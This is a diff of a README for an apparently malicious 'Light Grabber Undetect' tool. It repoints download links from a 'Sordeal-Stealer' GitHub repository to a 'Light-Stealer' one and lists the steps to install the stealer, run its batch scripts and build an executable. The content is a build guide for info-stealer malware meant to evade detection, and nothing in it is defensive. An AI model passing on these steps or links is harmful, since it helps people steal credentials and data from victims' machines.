@@ -1,9 +1,9 @@
 	LIGHT GRABBER UNDETECT
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [Sordeal Files](https://github.com/SOrdeal/Sordeal-Stealer/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/SOrdeal/Sordeal-Stealer/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/SOrdeal/Sordeal-Stealer/blob/main/start.bat)
+2. Install [Light Files](https://github.com/Light/Light-Stealer/archive/refs/heads/main.zip)
+3. Install all requirements [install.bat](https://github.com/Light/light-Stealer/blob/main/install.bat)
+4. Click on start.bat [start.bat](https://github.com/Light/Light-Stealer/blob/main/start.bat)
 5. Complete the configuration
 6. You have your .exe/.py file enjoy
 
